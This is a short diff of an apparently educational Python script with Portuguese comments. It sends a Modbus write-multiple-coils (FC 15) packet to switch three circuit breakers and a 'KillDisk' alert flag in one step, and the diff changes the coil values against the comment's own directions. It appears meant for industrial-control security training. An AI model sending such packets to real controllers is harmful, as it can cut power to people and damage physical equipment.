@@ -16,7 +16,7 @@ print("    que escreve em múltiplos registradores num único pacote (byte 0x0F)
 # Altere a lista abaixo para desligar os 3 disjuntores (False, False, False)
 # e ativar o alerta do KillDisk no 4º registrador (True) de uma só vez!
 # =====================================================================
-payload_coils = [False, False, False, True]  # [Disjuntor1, Disjuntor2, Disjuntor3, KillDisk]
+payload_coils = [True, True, True, False]  # [Disjuntor1, Disjuntor2, Disjuntor3, KillDisk]
 
 print(f"[!] Enviando pacote FC 15 (0x0F) com payload: {payload_coils}")
 res = client.write_coils(0, payload_coils)
